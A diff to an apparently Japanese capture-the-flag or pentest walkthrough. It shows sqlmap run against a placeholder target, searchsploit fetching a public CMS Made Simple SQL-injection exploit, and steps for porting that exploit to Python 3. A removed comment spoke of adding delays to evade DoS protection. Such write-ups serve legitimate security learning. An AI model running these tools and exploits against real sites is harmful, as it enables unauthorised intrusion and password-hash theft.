@@ -111,13 +111,15 @@ sqlmap -u "http://[TARGET]/page" \
 # searchsploit でエクスプロイトを確認・取得
 searchsploit cms made simple
 searchsploit -m php/webapps/46635.py
-
-# Python3 環境では2系スクリプトを移植する必要がある場合がある
-# 主な変更点:
-#   print 文 → print() 関数
-#   hashlib.md5(str(salt) + word) → hashlib.md5((salt + word).encode()).hexdigest()
-#   リクエスト間に time.sleep(0.5) を追加（DoS保護回避）
 ```
+
+**Python 2系スクリプトを Python 3 で動かす手順：**
+1. `searchsploit -m [PATH]` でスクリプトをカレントディレクトリにコピーする
+2. `python [script.py]` を実行してエラーが出るか確認する
+3. エラーが出た場合はエディタで以下の箇所を修正する：
+   - `print "..."` → `print("...")`
+   - `hashlib.md5(str(salt) + word)` → `hashlib.md5((salt + word).encode()).hexdigest()`
+4. 修正後に再実行する
 
 **ペイロード構造（タイムベース文字抽出）：**
 ```
